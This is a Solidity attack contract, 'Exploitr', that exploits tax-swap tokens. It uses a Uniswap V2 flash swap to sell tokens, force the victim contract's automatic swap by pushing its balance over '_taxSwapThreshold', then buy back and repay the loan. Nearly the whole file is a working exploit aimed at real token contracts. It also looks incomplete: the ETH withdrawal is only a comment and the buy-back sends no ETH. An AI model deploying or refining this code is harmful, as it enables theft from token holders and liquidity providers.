// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract Exploitr is IUniswapV2Callee {
    address private constant UNISWAP_V2_FACTORY =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNISWAP_V2_ROUTER =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    IUniswapV2Factory private constant _factory =
        IUniswapV2Factory(UNISWAP_V2_FACTORY);
    IUniswapV2Router02 private constant _router =
        IUniswapV2Router02(UNISWAP_V2_ROUTER);

    VictimInterface private _victim;
    uint256 _overflowAmount = 0;

    function goGoPowerRangers(address victimAddress) external {
        _victim = VictimInterface(victimAddress);

        uint256 contractBalance = _victim.balanceOf(address(_victim));
        uint256 threshold = _victim._taxSwapThreshold();
        _overflowAmount = (threshold - contractBalance);

        IUniswapV2Pair pair = IUniswapV2Pair(
            _factory.getPair(address(_victim), _router.WETH())
        );

        // Flash loan how much? Let's do 10% of contract balance for now. + overflow
        uint arbitragePot = contractBalance / 10;
        bytes memory data = abi.encodePacked(uint(1)); // enable flash
        pair.swap(_overflowAmount + arbitragePot, 0, address(this), data);

        // Send remaining ETH to myself
    }

    // Flash callback
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint /*amount1*/,
        bytes calldata /*data*/
    ) external {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = _factory.getPair(token0, token1);
        assert(msg.sender == pair);
        assert(sender == address(this));

        // about 0.3% fee, +1 to round up
        uint fee = (amount0 * 3) / 997 + 1;
        uint amountToRepay = amount0 + fee;

        // Sell tokens for ETH
        address[] memory path = new address[](2);
        path[0] = address(_victim);
        path[1] = _router.WETH();
        uint arbPot = amount0 - _overflowAmount;
        uint deadline = block.timestamp + 150;
        _victim.approve(address(_router), _victim.balanceOf(address(this)));
        _router.swapExactTokensForETH(arbPot, 0, path, address(this), deadline);

        // Force liquidation
        _victim.transfer(address(_victim), _overflowAmount);

        // Buy back tokens
        _router.swapETHForExactTokens(
            amountToRepay,
            path,
            address(this),
            deadline
        );

        // Repay
        _victim.transfer(address(pair), amountToRepay);
    }
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function token0() external view returns (address);

    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface VictimInterface is IERC20 {
    function _taxSwapThreshold() external returns (uint256);
}

interface IUniswapV2Router01 {
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function WETH() external pure returns (address);

    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}
